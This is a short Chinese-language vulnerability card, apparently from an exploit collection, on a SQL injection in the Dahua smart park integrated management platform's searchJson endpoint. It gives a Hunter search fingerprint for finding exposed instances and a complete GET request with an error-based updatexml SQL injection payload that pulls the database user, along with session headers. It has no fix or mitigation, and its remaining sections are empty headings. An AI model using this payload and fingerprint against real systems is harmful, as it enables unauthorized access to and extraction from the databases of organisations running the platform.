# 大华智慧园区综合管理平台searchJsonSQL注入漏洞

- **系统**：大华　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`hunter：`app.name="Dahua 大华 智慧园区管理平台"``
- **请求**：`GET /portal/services/carQuery/getFaceCapture/searchJson/%7B%7D/pageJson/%7B%22orderBy%22:%221%20and%201=updatexml(1,concat(0x7e,(select%20user()),0x7e),1)--%22%7D/extend/%7B%7D HTTP/1.1`
- **关键头**：`Host: xx.xx.xx.xx`　`Cookie: JSESSIONID=0B95DCE16676556E16169127452F23E1`　`Sec-Fetch-User: ?1`

**请求体 / payload**
```

```

**其他**
- 大华智慧园区综合管理平台searchJson SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 大华智慧园区综合管理平台